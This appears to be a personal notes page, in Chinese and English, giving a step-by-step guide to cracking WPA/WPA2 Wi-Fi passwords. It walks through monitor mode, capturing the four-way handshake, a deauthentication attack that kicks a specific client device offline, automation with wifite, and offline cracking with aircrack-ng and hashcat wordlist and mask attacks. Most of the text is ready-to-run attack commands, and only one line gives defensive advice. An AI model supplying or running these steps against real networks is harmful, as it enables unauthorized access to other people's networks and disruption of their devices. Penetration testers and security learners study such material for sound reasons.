EAPOL Extensible Authentication Protocol over LAN（局域网可扩展认证协议）

在 WPA/WPA2 加密的 WiFi 破解中，EAPOL 数据包（也就是大名鼎鼎的“四次握手包”）是你唯一需要的东西！


[pfSense is an open-source firewall and router software distribution based on FreeBSD, originating in 2004 as a fork of the m0n0wall project, with its first release in October 2006.](https://www.pfsense.org/)

[evil limiter - A tool to monitor, analyze and limit the bandwidth (upload/download) of devices on your local network without physical or administrative access.](https://github.com/bitbrute/evillimiter)

[Detecting Wi-Fi attacks using microcontrollers with the Deauth Detector](https://www.youtube.com/watch?v=UPYpzheTMv8)

[SecurityFWD shows the latest security tools, amazing projects, and keeps you on the edge of what's possible in security today.](https://www.youtube.com/c/SecurityFWD/videos)


[尝试着破解Wi-Fi密码，创建虚假网络，或者窥探其它设备的通信 ](https://lifehacker.com/how-to-hack-your-own-network-and-beef-up-its-security-w-1649785071)


[监控处于同一网络中的所有设备](http://lifehacker.com/how-to-tap-your-network-and-see-everything-that-happens-1649292940)


## network info
WEP network
WPA network

The best protection here is a good, strong password on your router. The longer, weirder, and more complex it is, the better. Likewise, make sure you're using the WPA2 security protocol and you don't have WPS enabled.

## arp-scan
arp-scan -l -I eth0

## Aircrack-ng

[Tutorial: How to Crack WPA/WPA2](https://www.aircrack-ng.org/doku.php?id=cracking_wpa)

```

iwconfig

#In order to use Aircrack, you'll need a wireless card that supports injections. Type this into the Terminal to make sure your card supports it:

airmon-ng

#This lists all the wireless cards that support this crack. If you card doesn't support injections, it won't show up here. Yours is likely listed under interface as wlan0, but it may depend on your machine, Replace wlan0 with your card's interface address. You should get a message back saying that monitor mode was enabled（#如果已经开启就kill先 airmon-ng check kill）:

airmon-ng start wlan0

#可以看到wlan0变成了wlan0mon了，说明开启了监听模式，接下来使用

airodump-ng wlan0mon

#You'll see all the networks in your area. Locate your network from the list, and copy the BSSID, while making a note of the channel it's on. Tap Ctrl+C to stop the process. replacing the information in parentheses with the information you gathered above:

airodump-ng -c (channel) --bssid (bssid) -w /root/Desktop/ (monitor interface)

例如目标是Xiaomi_57DB 使用命令获取握手包，4 是 WIFI 所在的频道CH，xiaomi_57db 是抓到的包要保存的文件名，我这里直接用 WIFI 名称。C8:BF:4C:CE:57:DC为路由器 mac 地址，最后是网卡名字。
airodump-ng -c 4 -w ./xiaomi_57db --bssid C8:BF:4C:CE:57:DC wlan0mon

Now, you'll be monitoring your network. You should see four files pop up on the desktop. Don't worry about those now; you'll need one of them later. The next step is a bit of a waiting game, as you'll be sitting around waiting for a device to connect to a network. You should see it pop up as a new station. Make a note of the station number, because you'll need that in the next step
如果上面一行内容都没有，说明当前没有设备连接了该路由器。那么这个时候建议换一个时间再试试，或者换一个 WIFI。

Now, you're going to force a reconnect so you can capture the handshake between the computer and the router. Leave Airodump running and open up a new tab in Terminal. Then type in:
aireplay-ng -0 2 -a (router bssid) -c (client station number) wlan0mon

例如执行如下命令开始解除认证攻击（换言之，就是把目标踢下线）：
aireplay-ng -0 20 -a C8:BF:4C:CE:57:DC -c 8E:A8:89:C9:3D:DF wlan0mon
-0 表示攻击模式为持续攻击，20 代表攻击 20 次，如果为 0，则攻击无限次，一般十几二十次就够了。C8:BF:4C:CE:57:DC 是路由器 mac 地址，8E:A8:89:C9:3D:DF是要攻击的设备 mac 地址，即上面监听到的流量的 Station 那一列。

You'll now see Aireplay send packets to your computer to force a reconnect. Hop back over to the Airodump tab and you'll see a new number listed after WPA Handshake. If that's there, you've successfully grabbed the handshake and you can start cracking the password. 回到刚刚监听的窗口，等待一会儿。左上角出现 WPA handshake，说明成功抓到握手包！按 Ctrl + C 停止。此时执行

airmon-ng stop wlan0mon

You now have the router's password in encrypted form, but you still need to actually figure out what it is. To do this, you'll use a password list to try and brute force your way into the network. You can find these lists online, but Kali Linux includes a few small lists to get you started in the /usr/share/wordlists directory, so we'll just use one of those. To start cracking the password type this in:

aircrack-ng -a2 -b (router bssid) -w (path to wordlist) /Root/Desktop/*.cap
aircrack-ng -a2 -b 04:1E:64:98:96:AB -w /usr/share/wordlists/fern-wifi/common.txt /Root/Desktop/*.cap

最后使用字典进行爆破：

aircrack-ng -w /password.txt -b C8:BF:4C:CE:57:DC xiaomi_57db-01.cap
能不能成功就看字典够不够强大了，至此，破解完毕
```

fixed channel wlan0mon -1 

```
sudo ip link set wlan0 down

sudo airmon-ng check kill

iwconfig wlan0mon channel 6

```

## Wifite（无线网络自动化攻击利器）

Wifite is just an automation wrapper around other tools in Kali Linux like:
    - Aircrack-ng
    - Reaver
    - Hashcat

Wifite 是一个专为 Linux 系统设计的自动化无线网络攻击工具，支持 WEP、WPA、WPA2、WPS 和 WPA3 等多种加密类型的攻击。它的自动化特性使其成为渗透测试员和网络安全研究者的得力助手。
自动化攻击：无需复杂配置，轻松发起攻击。
支持多协议：可对多种加密协议进行测试。
灵活实用：内置多种攻击方式，包括抓握手包、字典攻击和 PIN 攻击等。

```

sudo apt update && sudo apt upgrade

sudo apt install wifite
```

检查无线网卡

    确保网卡支持监控模式，并已连接至电脑。
    使用 iwconfig 查看无线设备状态。
    ```
    linux:
    关闭网卡：: sudo ifconfig <interface_name> down (将<interface_name>替换为你的网卡接口名称，如wlan0)。
    设置监控模式：: sudo iwconfig <interface_name> mode monitor。
    启动网卡：: sudo ifconfig <interface_name> up。
    验证模式：: 输入iwconfig并查看你的网卡。 如果输出中有 Mode:Monitor 字样，则表示网卡支持并已成功进入监控模式。 

    windows:
    要确认Win10 网卡是否支持监控模式，可以使用Npcap 工具自带的 WlanHelper.exe 命令，
    或者在命令提示符中执行 netsh wlan show drivers 命令。 
    如果列表中包含 802.11n、802.11ac 等支持监控模式的模式
    （例如，在某些版本的驱动程序中，Monitor mode 是一个明确的选项），则表示支持
    许多笔记本电脑自带的无线网卡默认只支持 managed 模式，可能不支持监控模式。 
    在这种情况下，你需要购买一个支持监控模式的外部无线网卡才能进行监控。
    ```

```

sudo airmon-ng start wlan0 #将 wlan0 替换为您网卡的接口名称。

sudo wifite

扫描完成后，软件将列出所有可用的无线网络。
输入网络编号选择目标网络。
系统会显示可用的攻击选项。
选择适合的攻击类型（如握手包捕获、WPS 攻击等）。

系统开始执行所选攻击类型。此过程可能需要数分钟。
成功后，将在指定目录下保存捕获的数据包。

使用工具（如 Aircrack-ng）分析捕获的数据包，尝试破解密码。
aircrack-ng -w /path/to/wordlist /path/to/capture.cap


```

## crack
```
sudo apt update
sudo apt install hcxtools -y

# 第一步：洗净原始 cap 包，提取有效握手（生成 cleaned.cap）
wpaclean cleaned.cap your_capture.cap

# 第二步：再把洗干净的 cleaned.cap 转换成 hc22000
hcxpcapngtool -o output.hc22000 cleaned.cap

hashcat -I
如果屏幕上打印出了关于 AMD Radeon Graphics的设备信息（包含 OpenCL API 版本等），说明驱动安装成功，环境配置已完成，可以直接开始运行 Hashcat。

hashcat -m 22000 -a 0 output.hc22000 /usr/share/wordlists/rockyou.txt

比如你知道密码是 8位，且只包含“小写字母”和“数字”（位置无规律）：
hashcat -m 22000 -a 3 -1 ?l?d output.hc22000 ?1?1?1?1?1?1?1?1
如果是 “大写字母 + 小写字母 + 数字”​ 的混合：
hashcat -m 22000 -a 3 -1 ?u?l?d output.hc22000 ?1?1?1?1?1?1?1?1

如果你知道密码是由两段固定的特征拼起来的（比如前半部分是纯数字，后半部分是纯字母），可以用 -a 1组合攻击，省去定义复杂规则的麻烦。

例如：密码是 3个数字 + 3个小写字母（等价于 123abc）：

# 先创建两个对应规则的文件
echo "?d?d?d" > mask_left.txt
echo "?l?l?l" > mask_right.txt

# 执行组合攻击
hashcat -m 22000 -a 1 output.hc22000 mask_left.txt mask_right.txt

A segmentation fault with Hashcat on a Raspberry Pi is almost never about your command — it’s usually environment / build / hardware limits.

8-digit attack:
hashcat.exe -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d
4 letters + 4 digits:
hashcat.exe -m 22000 hash.hc22000 -a 3 ?l?l?l?l?d?d?d?d

hashcat --restore
```